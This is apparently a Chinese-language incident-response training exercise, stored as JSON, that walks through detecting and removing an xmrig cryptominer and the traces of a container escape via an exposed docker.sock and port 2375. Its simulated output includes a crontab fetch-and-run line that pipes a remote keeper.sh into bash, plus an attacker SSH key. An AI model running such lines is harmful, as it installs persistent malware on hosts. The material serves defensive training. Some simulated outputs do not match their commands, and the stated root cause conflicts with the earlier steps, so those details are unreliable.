@@ -1,0 +1,74 @@
+{
+  "updated": "2026-09-28",
+  "items": [
+    {
+      "id": "sc-017",
+      "title": "Docker 容器内挖矿与逃逸痕迹排查",
+      "os": "linux",
+      "category": "挖矿",
+      "difficulty": 3,
+      "background": "工单描述：某公司容器化业务宿主机（CentOS 7.9，IP 172.17.8.25，运行 Docker 化 Java API 服务）监控告警 CPU 持续 400%+，运维进入宿主机用 top 发现异常进程但定位不明；据排查该宿主机 Docker API（2375 端口）曾为调试临时对内网全开放未做认证，且业务容器挂载了 /var/run/docker.sock。请排查容器内挖矿与可能的容器逃逸痕迹，并完成处置加固。",
+      "steps": [
+        {
+          "prompt": "第一步：登录宿主机，确认整体 CPU 异常与正在运行的容器，应该执行什么命令？",
+          "commands": [
+            "top -bn1 | head -n 8",
+            "docker ps -a"
+          ],
+          "simulated_output": "root@docker-prod:~# top -bn1 | head -n 8\ntop - 09:41:18 up 22 days, 23:29,  2 users,  load average: 4.12, 3.98, 3.86\n%Cpu(s): 92.1 us,  1.1 sy,  0.0 ni,  6.6 id\n  PID USER      PR  NI    VIRT    RES  SHR S  %CPU  %MEM     TIME+ COMMAND\n18821 root      20   0 3227112 301220   2108 S 402.1   1.8  15221:41 /usr/bin/xmrig --donate-level=1\nroot@docker-prod:~# docker ps -a\nCONTAINER ID   IMAGE                    COMMAND                  CREATED      STATUS                    PORTS                   NAMES\na1f2e8b9c3d4   registry.local/api:2.1   \"/entrypoint.sh java …\"  22 days ago  Up 22 days                0.0.0.0:8080->8080/tcp  api-web\n7c8d9e0f1a2b   xmrig/miner:latest       \"/usr/bin/xmrig …\"       2 days ago   Exited (0) 26 hours ago                           helper-01\nb3c4d5e6f7a8   alpine:3.19              \"sleep infinity\"         2 days ago   Up 2 days                                         sysprobe",
+          "hint": "宿主机上 xmrig 进程实际来自容器内（PID 属于 docker 容器）。注意两个陌生容器：xmrig/miner 镜像的 helper-01 和 alpine 的 sysprobe——后者常被用作逃逸跳板。",
+          "explanation": "top 显示 /usr/bin/xmrig 占用 402% CPU，是知名门罗币挖矿程序；docker ps 发现三个容器，业务容器 api-web 之外还有 xmrig/miner 镜像的 helper-01（已退出）与 alpine 的 sysprobe（存活）。在宿主机视角，容器进程同样出现在 top 中，需结合 docker top 确定进程归属。下一步进入业务容器确认挖矿进程与落地文件。"
+        },
+        {
+          "prompt": "第二步：进入 api-web 容器，确认容器内进程与可疑文件，应该执行什么命令？",
+          "commands": [
+            "docker exec api-web ps aux",
+            "docker exec api-web ls -la /tmp",
+            "docker exec api-web cat /tmp/config_pool.json"
+          ],
+          "simulated_output": "root@docker-prod:~# docker exec api-web ps aux\nUSER   PID   %CPU %MEM    VSZ   RSS TTY   STAT START  TIME COMMAND\nroot     1   0.0  0.2  168932 12200 ?      Ss   Sep26  0:41 java -jar /app/api.jar\nroot    88   402  1.9  3227112 301220 ?     Ssl  Sep26  15221:41 /usr/bin/xmrig --donate-level=1 -o pool.minexmr-alt.com:4444\nroot   102   0.0  0.0   116440  3420 ?      S    Sep26  0:01 /bin/sh -c curl -fsSL http://209.141.45.12:8220/keeper.sh | bash\nroot@docker-prod:~# docker exec api-web ls -la /tmp\ntotal 5180\n-rwxr-xr-x  1 root root  5218304 Sep 26 03:42 xmrig\n-rw-r--r--  1 root root      512 Sep 26 03:42 config_pool.json\n-rw-------  1 root root      118 Sep 26 03:42 .keeper.lock\nroot@docker-prod:~# docker exec api-web cat /tmp/config_pool.json\n{\n  \"pools\": [{ \"url\": \"stratum+tcp://209.141.45.12:4444\", \"user\": \"4A1xYq9nJkqZLm2PfT8vBgR...\", \"pass\": \"x\", \"donate-level\": 1 }]\n}",
+          "hint": "容器 PID 1 是正常 java，而 xmrig 的父进程链值得追查；config_pool.json 指向矿池 209.141.45.12:4444；/tmp/xmrig 落地时间为 9 月 26 日 03:42。",
+          "explanation": "容器内确认 xmrig 正在挖矿（矿池 stratum+tcp://209.141.45.12:4444），另有 keeper.sh 下载执行脚本常驻。落地的 /tmp/xmrig 与 config_pool.json 是挖矿配置证据。时间 03:42 与宿主机 secure 日志中攻击者登录时间吻合，说明攻击链先于宿主机动作。接下来核查容器配置是否存在逃逸条件。"
+        },
+        {
+          "prompt": "第三步：检查 api-web 容器的挂载与权限配置，评估是否存在容器逃逸条件，应该执行什么命令？",
+          "commands": [
+            "docker inspect api-web --format '{{json .HostConfig.Binds}}'",
+            "docker inspect api-web --format '{{.HostConfig.Privileged}} {{.HostConfig.CapAdd}}'",
+            "ls -l /var/run/docker.sock",
+            "cat /opt/api/docker-compose.yml"
+          ],
+          "simulated_output": "root@docker-prod:~# docker inspect api-web --format '{{json .HostConfig.Binds}}'\n[\"/var/run/docker.sock:/var/run/docker.sock\",\"/data/applogs:/app/logs\"]\nroot@docker-prod:~# docker inspect api-web --format '{{.HostConfig.Privileged}} {{.HostConfig.CapAdd}}'\nfalse [NET_ADMIN SYS_ADMIN]\nroot@docker-prod:~# ls -l /var/run/docker.sock\nsrw-rw---- 1 root docker 0 Sep  5 10:12 /var/run/docker.sock\nroot@docker-prod:~# cat /opt/api/docker-compose.yml\n    volumes:\n      - \"/var/run/docker.sock:/var/run/docker.sock\"   # 隐患: 挂载宿主机 docker.sock\n    cap_add:\n      - NET_ADMIN\n      - SYS_ADMIN",
+          "hint": "容器挂载了宿主机 /var/run/docker.sock 且容器内进程为 root——容器内可直接调用 Docker API 创建任意特权容器，等同接管宿主机。",
+          "explanation": "docker.sock 挂载 + 容器内 root 权限 = 容器逃逸的经典组合：容器内进程通过 sock 调用 Docker API，可挂载宿主机根目录创建特权容器，完全绕过隔离。docker-compose.yml 与附加的 SYS_ADMIN 能力进一步放大风险。这一配置解释了攻击者为何能从容器内控制宿主机。接下来寻找逃逸的落地痕迹。"
+        },
+        {
+          "prompt": "第四步：在宿主机上寻找逃逸后的持久化痕迹，应该执行什么命令？",
+          "commands": [
+            "crontab -l",
+            "cat /root/.ssh/authorized_keys",
+            "grep -E 'container (create|start)' /var/log/secure | head -n 5",
+            "ss -antup | grep -E ':4444|:2375'"
+          ],
+          "simulated_output": "root@docker-prod:~# crontab -l\n*/1 * * * * curl -fsSL http://209.141.45.12:8220/keeper.sh | bash > /dev/null 2>&1\nroot@docker-prod:~# cat /root/.ssh/authorized_keys\nssh-rsa AAAAB3NzaC1yc2E...opsbastion@ops\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOp9...3mQx= escape@91.245.77.13\nroot@docker-prod:~# grep -E 'container (create|start)' /var/log/secure\nSep 26 03:42:11 dockerd[1355]: container create: helper-01, image=xmrig/miner:latest\nSep 26 03:43:01 dockerd[1355]: container start: sysprobe, image=alpine:3.19, mounts=[/var/run/docker.sock]\nroot@docker-prod:~# ss -antup | grep -E ':4444|:2375'\ntcp   ESTAB  0   0  172.17.8.25:41882  209.141.45.12:4444  users:((\"xmrig\",pid=18821))\ntcp   LISTEN 0 128 0.0.0.0:2375  0.0.0.0:* users:((\"dockerd\",pid=1355))",
+          "hint": "逃逸痕迹三件套：宿主 crontab 被写入 keeper.sh 下载任务、root 公钥追加 escape@91.245.77.13、dockerd 日志记录通过 sock 创建的陌生容器；2375 未认证端口也在对外监听。",
+          "explanation": "完整的逃逸链：攻击者（91.245.77.13）9 月 26 日 03:41 登录宿主机/经 2375 端口操控 Docker → 在容器内植入 xmrig → 利用挂载的 docker.sock 创建 sysprobe/helper-01 容器 → 逃逸后在宿主机写入 cron 与公钥后门。2375 无认证端口 + docker.sock 挂载是双重根因。下一步执行清除与加固。"
+        },
+        {
+          "prompt": "第五步：执行清除与加固。写出处置命令与容器安全基线措施。",
+          "commands": [
+            "docker rm -f helper-01 sysprobe && docker rmi xmrig/miner:latest",
+            "crontab -r && sed -i '/escape@91.245.77.13/d' /root/.ssh/authorized_keys",
+            "docker exec api-web pkill -9 xmrig; docker exec api-web rm -f /tmp/xmrig /tmp/config_pool.json",
+            "docker stop api-web && sed -i '/docker.sock/d;/SYS_ADMIN/d' /opt/api/docker-compose.yml",
+            "ss -antup | grep -E ':2375|:4444'; docker ps"
+          ],
+          "simulated_output": "root@docker-prod:~# docker rm -f helper-01 sysprobe\nhelper-01\nsysprobe\nroot@docker-prod:~# crontab -r\nroot@docker-prod:~# docker stop api-web && docker start api-web\napi-web\nroot@docker-prod:~# ss -antup | grep -E ':2375|:4444'\n（无输出, 2375 已关闭）\nroot@docker-prod:~# docker ps\nCONTAINER ID   IMAGE                    COMMAND                  STATUS         NAMES\na1f2e8b9c3d4   registry.local/api:2.1   \"/entrypoint.sh java …\"  Up 10 seconds  api-web",
+          "hint": "清除顺序：先删陌生容器与镜像 → 清宿主机 cron/公钥 → 容器内杀挖矿删文件 → 用干净镜像重建容器（移除 sock 挂载与多余 capabilities）→ 关闭 2375 并复查。",
+          "explanation": "处置：删除陌生容器与恶意镜像；清理宿主机 cron 与公钥；容器内杀 xmrig、删落地文件；用重新构建的安全镜像重建 api-web（去掉 docker.sock 挂载、cap_add、SYS_ADMIN），并从 daemon.json 移除 tcp://0.0.0.0:2375。加固基线：镜像签名与漏洞扫描、容器以非 root 运行、--cap-drop=ALL 按需添加、只读根文件系统、seccomp/AppArmor 限制、宿主机与 Docker 版本及时更新、对 docker.sock 操作开审计。"
+        }
+      ],
+      "summary": "本案例演练 Docker 容器挖矿与逃逸排查：top/docker ps 发现容器内 xmrig（矿池 209.141.45.12:4444）与陌生容器 → docker exec 确认容器内落地文件与挖矿配置 → docker inspect 发现挂载 /var/run/docker.sock + SYS_ADMIN 的逃逸条件 → 宿主机追出逃逸痕迹（cron keeper.sh、公钥 escape@91.245.77.13、dockerd 容器创建日志、2375 无认证端口）→ 删容器/镜像/任务/公钥并重建安全容器。根因：镜像构建链被投毒 + docker.sock 挂载导致容器逃逸。教训：docker.sock 等同宿主机 root 权限，绝不可挂载进不可信容器；Docker API 必须禁止无认证暴露。"
+    }
+  ]
+}
